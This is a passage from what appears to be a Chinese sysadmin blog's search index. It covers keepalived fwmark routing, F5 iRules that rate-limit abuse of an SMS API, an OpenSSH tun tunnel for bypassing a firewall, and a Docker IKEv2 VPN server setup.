class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e具体的一个用法，如果你想禁止从1.2.3.4来的ip访问你服务器，于是乎你就可以先给包打上标签2000，然后配个服务器，上面写联系人和电话，单独给他看，他看到会联系你询问被屏蔽的原因，如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirtual_server fwmark \u003cspan class=\"m\"\u003e2000\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edelay_loop \u003cspan class=\"m\"\u003e6\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e lb_algo wlc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e lb_kind NAT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e persistence_timeout \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e protocol TCP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ereal_server 10.10.10.1 \u003cspan class=\"m\"\u003e80\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e weight \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e TCP_CHECK \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  connect_port \u003cspan class=\"m\"\u003e80\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  connect_timeout \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Keepalived与iptables mark的联动"},{"content":"公司的服务器遭受了攻击，某些人不停调用公司服务器发送短信的api，真是有够无聊的。\n由于我们的架构是前面F5 Bigip，后面接了N个Tomcat，那就直接写个F5的irule来阻止它。\n阻止GET请求的频率，30秒只允许单个ip发5次\n假设GET的模式是 GET /sendsms.do?mobile=13800000000\u0026amp;msg=aaaaaaaa irule里有个非常神奇的东西，table，是session会话表的超表，基本操作是key-value型，带有生存时间，这点最重要。\n详细的大家可以去看：\nhttps://clouddocs.f5.com/api/irules/table.html\n阻止GET的irule：\nwhen RULE_INIT { set static::windowSecs 30 } when HTTP_REQUEST { if { ( [HTTP::method] equals \u0026#34;GET\u0026#34; ) \u0026amp;\u0026amp; ( [HTTP::uri] starts_with \u0026#34;/sendsms.do\u0026#34; ) } { set myUserId [IP::client_addr] set myMaxRate 5 if { $myMaxRate ne \u0026#34;\u0026#34; } { set reqnum [table incr \u0026#34;req:$myUserId\u0026#34;] set tbl \u0026#34;countpost:$myUserId\u0026#34; table set -subtable $tbl $reqnum \u0026#34;ignored\u0026#34; indef $static::windowSecs if { [table keys -subtable $tbl -count] \u0026gt; $myMaxRate } { HTTP::respond 403 \u0026#34;Block\u0026#34; return } } } } 来个更加复杂的例子：\nPOST的请求如下：\nPOST /api/sendMessage.htm HTTP/1.1 Content-Length: 203 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Host: 172.8.2.23 Connection: Keep-Alive User-Agent: Apache-HttpClient/4.5 (Java/1.7.0_51) Accept-Encoding: gzip,deflate action=order.sumit.order\u0026amp;jsonData=%7B%22channelCode%22%3A%22%22%2C%22mobiles%22%3A%5B%2215176989787%22%5D%2C%22source%22%3A%22pop%22%2C%22tempParameters%22%3A%5B%22480827%22%2C%2291%22%5D%2C%22templateId%22%3A2%7D 我们要阻止POST /api/sendMessage.htm且action=sendmsg的话，就比较复杂一些，我们判断uri满足条件后，还要进一步判断content中action=的内容：\nwhen RULE_INIT { set static::windowSecs 10 } when HTTP_REQUEST { if { ( [HTTP::method] equals \u0026#34;POST\u0026#34; ) \u0026amp;\u0026amp; ( [HTTP::uri] equals \u0026#34;/api/sendMessage.htm\u0026#34; ) \u0026amp;\u0026amp; ([HTTP::header \u0026#34;Content-Length\u0026#34;] \u0026lt;= 2048) } { HTTP::collect [HTTP::header Content-Length] } } when HTTP_REQUEST_DATA { set myUserId [IP::client_addr] set mymethod \u0026#34;unknown\u0026#34; foreach x [split [string tolower [HTTP::payload]] \u0026#34;\u0026amp;\u0026#34;] { if { $x starts_with \u0026#34;action=\u0026#34; } { set mymethod [lindex [split $x \u0026#34;=\u0026#34;] 1] } } if { $mymethod equals \u0026#34;order.submit.order\u0026#34; } { set myMaxRate 5 if { $myMaxRate ne \u0026#34;\u0026#34; } { set reqnum [table incr \u0026#34;req:$myUserId\u0026#34;] set tbl \u0026#34;countpost:$myUserId\u0026#34; table set -subtable $tbl $reqnum \u0026#34;ignored\u0026#34; indef $static::windowSecs if { [table keys -subtable $tbl -count] \u0026gt; $myMaxRate } { HTTP::respond 403 \u0026#34;Block\u0026#34; return } } } } ","permalink":"https://rendoumi.com/posts/20240111-f5_irule_ddos/","summary":"\u003cp\u003e公司的服务器遭受了攻击，某些人不停调用公司服务器发送短信的api，真是有够无聊的。\u003c/p\u003e\n\u003cp\u003e由于我们的架构是前面F5 Bigip，后面接了N个Tomcat，那就直接写个F5的irule来阻止它。\u003c/p\u003e\n\u003cp\u003e阻止GET请求的频率，30秒只允许单个ip发5次\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e假设GET的模式是\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGET /sendsms.do?mobile\u003cspan class=\"o\"\u003e=\u003c/span\u003e13800000000\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003emsg\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eaaaaaaaa  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eirule里有个非常神奇的东西，table，是session会话表的超表，基本操作是key-value型，带有生存时间，这点最重要。\u003c/p\u003e\n\u003cp\u003e详细的大家可以去看：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://clouddocs.f5.com/api/irules/table.html\"\u003ehttps://clouddocs.f5.com/api/irules/table.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e阻止GET的irule：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhen RULE_INIT \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003eset\u003c/span\u003e static::windowSecs \u003cspan class=\"m\"\u003e30\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhen HTTP_REQUEST \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eHTTP::method\u003cspan class=\"o\"\u003e]\u003c/span\u003e equals \u003cspan class=\"s2\"\u003e\u0026#34;GET\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eHTTP::uri\u003cspan class=\"o\"\u003e]\u003c/span\u003e starts_with \u003cspan class=\"s2\"\u003e\u0026#34;/sendsms.do\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nb\"\u003eset\u003c/span\u003e myUserId \u003cspan class=\"o\"\u003e[\u003c/span\u003eIP::client_addr\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nb\"\u003eset\u003c/span\u003e myMaxRate \u003cspan class=\"m\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"nv\"\u003e$myMaxRate\u003c/span\u003e ne \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nb\"\u003eset\u003c/span\u003e reqnum \u003cspan class=\"o\"\u003e[\u003c/span\u003etable incr \u003cspan class=\"s2\"\u003e\u0026#34;req:\u003c/span\u003e\u003cspan class=\"nv\"\u003e$myUserId\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nb\"\u003eset\u003c/span\u003e tbl \u003cspan class=\"s2\"\u003e\u0026#34;countpost:\u003c/span\u003e\u003cspan class=\"nv\"\u003e$myUserId\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                table \u003cspan class=\"nb\"\u003eset\u003c/span\u003e -subtable \u003cspan class=\"nv\"\u003e$tbl\u003c/span\u003e \u003cspan class=\"nv\"\u003e$reqnum\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ignored\u0026#34;\u003c/span\u003e indef \u003cspan class=\"nv\"\u003e$static\u003c/span\u003e::windowSecs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003etable keys -subtable \u003cspan class=\"nv\"\u003e$tbl\u003c/span\u003e -count\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u0026gt; \u003cspan class=\"nv\"\u003e$myMaxRate\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    HTTP::respond \u003cspan class=\"m\"\u003e403\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Block\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e来个更加复杂的例子：\u003c/p\u003e\n\u003cp\u003ePOST的请求如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePOST /api/sendMessage.htm HTTP/1.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eContent-Length: \u003cspan class=\"m\"\u003e203\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eContent-Type: application/x-www-form-urlencoded\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eUTF-8  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost: 172.8.2.23  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eConnection: Keep-Alive  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUser-Agent: Apache-HttpClient/4.5 \u003cspan class=\"o\"\u003e(\u003c/span\u003eJava/1.7.0_51\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAccept-Encoding: gzip,deflate\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eaction\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eorder.sumit.order\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ejsonData\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%7B%22channelCode%22%3A%22%22%2C%22mobiles%22%3A%5B%2215176989787%22%5D%2C%22source%22%3A%22pop%22%2C%22tempParameters%22%3A%5B%22480827%22%2C%2291%22%5D%2C%22templateId%22%3A2%7D  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们要阻止POST /api/sendMessage.htm且action=sendmsg的话，就比较复杂一些，我们判断uri满足条件后，还要进一步判断content中action=的内容：\u003c/p\u003e","title":"F5利用irule来防止Ddos的方法"},{"content":"openssh是支持隧道的，所以就可以在ssh中再套个管道，直接用来翻墙，做法如下：\n如上图，A机能ssh登录B机\nA机的IP：172.16.8.106\nB机的IP：172.16.8.108\nA机建立tunnel后tun的ip：192.168.244.1\nB机建立tunnel后tun的ip：192.168.244.2\n首先编辑A和B的/etc/ssh/sshd_config，允许tunnel，缺省是不允许的，然后service sshd restart ，重启sshd ... PermitTunnel yes ... A和B安装linux下的tun软件，并启动一个tunnel设备 yum install tunctl tunctl -t tun5 -u root 在A(172.16.8.106)机器上生成key，并设置能无密码证书直接登录B(172.16.8.108) ssh-keygen ssh-copy-id root@172.16.8.108 在A上执行命令，建立ssh tunnel： ssh -w 5:5 root@172.168.8.108 在A上执行 ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0 在B上执行 ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0 这样分别在A和B上ping 192.168.244.1和192.168.244.2，都能通就表示已经ok了。 优化一下，A和B两边都先把tun5启动以后，直接在A上一句话搞定，这个不会自动退出，所以得ctrl+z，然后bg放后台去，或者screen挂住：\nssh \\ -o PermitLocalCommand=yes \\ -o LocalCommand=\u0026#34;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0\u0026#34; \\ -o ServerAliveInterval=60 \\ -w 5:5 root@172.16.8.108 \\ \u0026#39;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0; echo tun5 ready\u0026#39; 如果要用在翻墙的环境，那就得保持长链接了。假设A机器是在一个防火墙后，且被NAT了，那么就得先这样打通隧道：\nssh -f -w5:5 vpn@example.com \\ -o ServerAliveInterval=30 \\ -o ServerAliveCountMax=5 \\ -o TCPKeepAlive=yes \\ -i ~/.ssh/id_rsa \u0026#34;sleep 1000000000\u0026#34; 然后在A和B上分别单独配置ip即可。\n再进阶：假设A要建立独立的netns空间，加ip及网关如下：\nip net add ns-vpn ip net exec ip addr add 100.64.42.2/24 dev tun42 ip net exec ip link set up dev tun42 ip net exec ip route add default via 100.64.42.1 再在B的/etc/sysctl.conf打开转发\nnet.ipv4.ip_forward = 1 sysctl -p iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -j SNAT --to 172.16.8.108 A就可以通过B代理出去了。\n","permalink":"https://rendoumi.com/posts/20240111-openssh_tunnel/","summary":"\u003cp\u003eopenssh是支持隧道的，所以就可以在ssh中再套个管道，直接用来翻墙，做法如下：\u003c/p\u003e\n\u003c!-- raw HTML omitted --\u003e\n\u003cp\u003e如上图，A机能ssh登录B机\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eA机的IP：172.16.8.106\u003c/p\u003e\n\u003cp\u003eB机的IP：172.16.8.108\u003c/p\u003e\n\u003cp\u003eA机建立\u003ccode\u003etunnel\u003c/code\u003e后tun的ip：192.168.244.1\u003c/p\u003e\n\u003cp\u003eB机建立\u003ccode\u003etunnel\u003c/code\u003e后tun的ip：192.168.244.2\u003c/p\u003e\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e首先编辑A和B的/etc/ssh/sshd_config，允许tunnel，缺省是不允许的，然后service sshd restart ，重启sshd\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePermitTunnel yes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA和B安装linux下的tun软件，并启动一个tunnel设备\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install tunctl  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etunctl -t tun5 -u root  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e在A(172.16.8.106)机器上生成key，并设置能无密码证书直接登录B(172.16.8.108)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-keygen  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-copy-id root@172.16.8.108  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e在A上执行命令，建立ssh tunnel：\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh -w 5:5 root@172.168.8.108  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e在A上执行\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e在B上执行\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e这样分别在A和B上ping 192.168.244.1和192.168.244.2，都能通就表示已经ok了。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e优化一下，A和B两边都先把tun5启动以后，直接在A上一句话搞定，这个不会自动退出，所以得ctrl+z，然后bg放后台去，或者screen挂住：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  -o \u003cspan class=\"nv\"\u003ePermitLocalCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -o \u003cspan class=\"nv\"\u003eLocalCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -o \u003cspan class=\"nv\"\u003eServerAliveInterval\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e60\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -w 5:5 root@172.16.8.108 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  \u003cspan class=\"s1\"\u003e\u0026#39;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0; echo tun5 ready\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如果要用在翻墙的环境，那就得保持长链接了。假设A机器是在一个防火墙后，且被NAT了，那么就得先这样打通隧道：\u003c/p\u003e","title":"用openssh的tunnel建立隧道翻墙"},{"content":"这篇文章只适用于在自己的vps上运行：\n步骤如下：\n1、拉回来镜像，ikev2-vpn-server，话说这么多年过去了，依然适用，2016年到现在\ndocker pull gaomd/ikev2-vpn-server 2、启动服务端，注意\u0026ndash;privileged参数，这个是必须的\ndocker run --privileged -d --name ikev2-vpn-server --restart=always -p 500:500/udp -p 4500:4500/udp gaomd/ikev2-vpn-server:0.3.0 搞定，只需要2步即可完成相对比较难搞的ikev2的安装.\n3、生成iphone客户端配置文件\ndocker run -i -t --rm --volumes-from ikev2-vpn-server -e \u0026#34;HOST=vpn.rendoumi.com\u0026#34; gaomd/ikev2-vpn-server:0.3.0 generate-mobileconfig \u0026gt; ikev2-vpn-ihone6s.mobileconfig 注意：vpn.rendoumi.com替换成你自己对应的ip或者域名\n然后你把这个配置文件下载，安装到MacOS或者iOS中，就可以愉快的玩耍了。\n","permalink":"https://rendoumi.com/posts/20240111-ikev2_docker/","summary":"\u003cp\u003e这篇文章只适用于在自己的vps上运行：\u003c/p\u003e\n\u003cp\u003e步骤如下：\u003c/p\u003e\n\u003cp\u003e1、拉回来镜像，ikev2-vpn-server，话说这么多年过去了，依然适用，2016年到现在\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker pull gaomd/ikev2-vpn-server  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e2、启动服务端，注意\u0026ndash;privileged参数，这个是必须的\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run --privileged -d --name ikev2-vpn-server --restart\u003cspan class=\"o\"\u003e=\u003c/span\u003ealways -p 500:500/udp -p 4500:4500/udp gaomd/ikev2-vpn-server:0.3.0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e搞定，只需要2步即可完成相对比较难搞的ikev2的安装.\u003c/p\u003e\n\u003cp\u003e3、生成iphone客户端配置文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run -i -t --rm --volumes-from ikev2-vpn-server -e \u003cspan class=\"s2\"\u003e\u0026#34;HOST=vpn.rendoumi.com\u0026#34;\u003c/span\u003e gaomd/ikev2-vpn-server:0.3.0 generate-mobileconfig \u0026gt; ikev2-vpn-ihone6s.mobileconfig  